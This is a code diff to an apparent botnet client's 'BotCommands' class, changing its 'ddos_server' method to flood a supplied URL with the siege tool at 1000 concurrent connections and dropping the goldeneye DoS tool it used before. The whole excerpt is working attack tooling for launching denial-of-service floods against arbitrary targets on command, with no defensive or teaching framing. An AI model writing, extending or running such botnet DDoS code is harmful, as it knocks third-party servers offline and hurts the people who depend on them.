@@ -23,10 +23,10 @@ class BotCommands(object):
     def ddos_server(self, url=None, ip=None, timeout=30):
         if self.ddos_process is None or not self.ddos_process.poll():
             if self.ddos_process is not None:
-                logging.debug("goldeneye: %s" % self.ddos_process.communicate())
+                logging.debug("siege: %s" % self.ddos_process.communicate())
 
             if url is not None and validators.url(url):
-                cmdstr = "timeout %d goldeneye '%s' -m random "%(timeout, url)
+                cmdstr = "siege -c 1000 -t %ds %s "%(timeout, url)
                 logging.debug(cmdstr)
                 ddos_process = subprocess.Popen(shlex.split(cmdstr))
             elif ip is not None and validators.ipv4(ip) or validators.ipv6(ip):
@@ -36,7 +36,7 @@ class BotCommands(object):
                 logging.warning("Neither ip nor url where supplied, DDOS failed")
                 logging.debug("isurl: %s, isip: %s"%(validators.url(str(url)), validators.ipv4(str(url)) or validators.ipv6(ip)))
         else:
-            logging.debug("goldeneye is still running")
+            logging.debug("siege is still running")
 
 cmdobject = BotCommands()
 
